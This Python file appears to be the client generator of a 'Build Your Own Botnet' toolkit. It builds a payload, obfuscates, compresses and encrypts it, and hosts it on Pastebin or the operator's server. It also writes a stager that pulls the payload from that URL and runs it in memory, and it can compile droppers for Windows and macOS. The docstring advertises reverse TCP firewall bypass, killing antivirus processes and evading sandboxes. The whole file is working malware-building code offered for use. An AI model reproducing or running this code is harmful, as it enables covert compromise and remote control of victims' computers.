#!/usr/bin/python
# -*- coding: utf-8 -*-
'Client Generator (Build Your Own Botnet)'
__doc__ = """ 

Generate clients with the following features:

    - Zero Dependencies
        stager runs with just the python standard library

    - Remote Imports
        remotely import third-party packages from
        the server without downloading/installing them

    - In-Memory Execution Guidline
        clients never write anything to the disk, 
        not even temporary files - zero IO system calls.
        remote imports allow code/scripts/modules to
        be dynamically loaded into memory and directly 
        imported into the currently running process

    - Add Your Own Scripts
        every python script, module, and package in the
        `remote` directory is directl usable by every 
        client at all times while the server is running

    - Unlimited Modules Without Bloating File Size
        use remote imports to add unlimited features without
        adding a single byte to the client's file size 

    - Updatable
        client periodically checks the content available
        for remote import from the server, and will 
        dynamically update its in-memory resources
        if anything has been added/removed

    - Platform Independent
        compatible with PyInstaller and package is authored 
        in Python, a platform agnostic language

    - Bypass Firewall
        connects to server via outgoing connections
        (i.e. reverse TCP payloads) which most firewall
        filters allow by default k

    - Evade Antivirus
        blocks any spawning process
        with names of known antivirus products

    - Prevent Analysis
        main client payload encrypted with a random 
        256-bit key and is only 

    - Avoid Detection
        client will abort execution if a virtual machine
        or sandbox is detected
"""
# standard library
import os
import sys
import imp
import json
import zlib
import struct
import base64
import random
import urllib
import urllib2
import marshal
import logging
import requests
import argparse
import threading
import subprocess

# packages
try:
    import colorama
    colorama.init(autoreset=True)
except: pass

# loading animation
from core.util import spinner
__load__ = threading.Event()
__load__.set()
#__spin__ = spinner(__load__)

# modules
from core import generators, security, util

# main
def main():
    parser = argparse.ArgumentParser(
        prog='client.py', 
        version='0.1.4',
        description="Client Generator (Build Your Own Botnet)",
	usage="""client.py [-h] [-v] [-n/--name NAME] [-i/--icon ICON]
		 [--pastebin API-KEY] [--randomize] [--encrypt]
                 [--obfuscate] [--compress] [--compile]
                 host port [module [module ...]]""")

    parser.add_argument('host',
                        action='store',
                        type=str,
                        help='server IP address')

    parser.add_argument('port',
                        action='store',
                        type=str,
                        help='server port number')

    parser.add_argument('modules',
			metavar='remote imports',
                        action='append',
                        nargs='*',
                        help='modules to remotely import at run-time')

    parser.add_argument('-n','--name',
			action='store',
			help='output file name')

    parser.add_argument('-i','--icon',
			action='store',
			help='icon image file name')

    parser.add_argument('--pastebin',
                        action='store',
			metavar='API',
                        help='upload & host payload on pastebin')

    parser.add_argument('--randomize',
                        action='store_true',
                        default=False,
                        help='randomize file hash by adding junk data')

    parser.add_argument('--encrypt',
                        action='store_true',
                        help='encrypt payload and embed key in stager',
                        default=False)

    parser.add_argument('--obfuscate',
                        action='store_true',
                        help='obfuscate names of classes, functions & variables',
                        default=False)

    parser.add_argument('--compress',
                        action='store_true',
                        help='zip-compress into a self-executing python script',
                        default=False)

    parser.add_argument('--compile',
                        action='store_true',
                        help='compile into a standalone bundled executable',
                        default=False)

    options = parser.parse_args()
    return run(options)

def progress_update(input, output, task=None):
    """ 
    Print a progress update about the code generated
    to the console in color

    `Requires`
    :param str input:      generator input
    :param str output:     generator output

    """
    diff = round(float(100.0 * float(float(len(output))/float(len(input)) - 1.0)))
    __load__.clear()
    util.display("\t[+]", color='green', style='bright', end=',')
    util.display(" ".join([task if task else "", "Complete" if len(str(task).split()) <= 1 else ""]), color='reset', style='bright')
    util.display("\t({:,} bytes {} to {:,} bytes ({}% {})".format(len(input), 'increased' if len(output) > len(input) else 'reduced', len(output), diff, 'larger' if len(output) > len(input) else 'smaller').ljust(80 - len("[+] ")), style='dim', color='reset')
    __load__.set()

def run(options):
    """ 
    Generate a client

    `Required`
    :param options:         parsed arguments

    Saves the output file to the ./byob/modules/payloads folder

    """
    from core import generators, security, util
    key     = base64.b64encode(os.urandom(16))
    var     = generators.variable(3)
    imports = set()

    # modules
    util.display("[>]", color='yellow', style='bright', end=',')
    util.display('Modules', color='reset', style='bright')
    modules = ['core/importer.py','core/util.py','core/security.py','core/payload.py']
    for m in modules:
        util.display('\tadding {}...'.format(os.path.splitext(m)[0].replace('/','.')), color='reset', style='dim')
    if len(options.modules):
        for m in options.modules:
	    if isinstance(m, str):
                util.display('\tadding {}...'.format(m), color='reset', style='dim')
                base = os.path.splitext(os.path.basename(m))[0]
                if not os.path.exists(m):
                    _m = os.path.join(os.path.abspath('modules'), os.path.basename(m))
                    if _m not in [os.path.splitext(_)[0] for _ in os.listdir('modules')]:
                        util.display("[-]", color='red', style='dim')
                        util.display("can't add module: '{}' (does not exist)".format(m), color='reset', style='dim')
                        continue
                module = os.path.join(os.path.abspath('modules'), m if '.py' in os.path.splitext(m)[1] else '.'.join([os.path.splitext(m)[0], '.py']))
                modules.append(module)

    # imports
    util.display("[>]", color='yellow', style='bright', end=',')
    util.display("Imports", color='reset', style='bright')
    for module in modules:
        for line in open(module, 'r').read().splitlines():
            if len(line.split()):
                if line.split()[0] == 'import':
		    imports.add(line.strip())
		elif len(line.split()) > 3:
		    if line.split()[0] == 'from' and line.split()[1] != '__future__' and line.split()[2] == 'import':
			imports.add(line.strip())
    util.display("\t[+]", color='green', style='bright', end=',')
    util.display("{} Imports Complete".format(len(list(imports))), color='reset', style='dim')
                 
    # payload
    util.display("[>]", color='yellow', style='bright', end=',')
    util.display("Payload", color='reset', style='dim')
    payload = '\n'.join(['#!/usr/bin/env python'] + list(imports) + [open(module,'r').read().partition('# main')[2] for module in modules]) + generators.snippet('main', 'Payload', **{"host": options.host, "port": options.port, "pastebin": options.pastebin if options.pastebin else str()}) + '_payload.run()'

    if options.obfuscate:
        util.display("\n\tObfuscating payload...", color='reset', style='dim')
        output  = generators.obfuscate(payload)
        progress_update(payload, output, task='Obfuscation')
        payload = output

    if options.compress:
        util.display("\n\tCompressing payload...", color='reset', style='dim')
        output  = generators.compress(payload)
        progress_update(payload, output, task='Compression')
        payload = output

    if options.encrypt:
        util.display("\n\tEncrypting payload...".format(key), color='reset', style='dim')
        output  = generators.encrypt(payload, key)
        progress_update(payload, output, task='Encryption')
        payload = output

    if options.pastebin:
        url = util.pastebin(payload, api_dev_key=options.pastebin)
    else:
	dirs = ['modules/payloads','byob/modules/payloads','byob/byob/modules/payloads']
        dirname = '.'
	for d in dirs:
	    if os.path.isdir(d):
		dirname = d
	path = os.path.join(os.path.abspath(dirname), var + '.py' )
        with file(path, 'w') as fp:
            fp.write(payload)
        url = 'http://{}:{}/{}'.format(options.host, options.port, urllib.pathname2url(path.strip(os.getcwd())))
        s   = urllib2.urlparse.urlsplit(url)
        url = urllib2.urlparse.urlunsplit((s.scheme, s.netloc, os.path.normpath(s.path), s.query, s.fragment))

    util.display("\t[+]", color='green', style='bright', end='')
    util.display("Upload Complete", color='reset', style='bright')
    util.display("\t\t(hosting payload at: {}".format(url), color='reset', style='dim')

    # stager
    util.display("[>]", color='yellow', style='bright', end=',')
    util.display("Stager", color='reset', style='dim')
    stager  = open('core/stager.py', 'r').read() + generators.snippet('main', 'run', url=url, key=key)

    if options.obfuscate:
        util.display("\n\tObfuscating stager...", color='reset', style='dim')
        output = generators.obfuscate(stager)
        progress_update(stager, output, task='Obfuscation')
        stager = output
    ''' 
    if options.compress:
        util.display("\n\tCompressing stager...", color='reset', style='dim')
        output = generators.compress(stager)
        progress_update(stager, output, task='Compression')
        stager = output
    '''
    # client
    util.display("[>]", color='yellow', style='bright', end=',')
    util.display("Client", color='reset', style='bright')
    client = 'byob_{}.py'.format(var) if not options.name else options.name
    if not client.endswith('.py'):
        client += '.py'
    with file(client, 'w') as fp:
        fp.write(stager)
    util.display("    (saved to file: {})".format(os.path.abspath(client)).ljust(80 - len("\t[+]")), style='dim', color='reset')

    # dropper
    if options.compile:
        if sys.platform == 'darwin':
            output = generators.app(options, client)
            progress_update(stager, open(os.path.join(output, 'Content', 'MacOS', os.path.basename(client))), task='Bundled Application')
            client = output
        else:
            output = generators.exe(options, client)
            progress_update(stager, open(output, 'rb').read(), task='Compiled Standalone Executable')
            client = output
        util.display( "    (saved to file: {})".format(os.path.abspath(client)).ljust(80 - len("\t[+]")), style='dim', color='reset')
    __load__.clear()
    return client

if __name__ == '__main__':
    main()
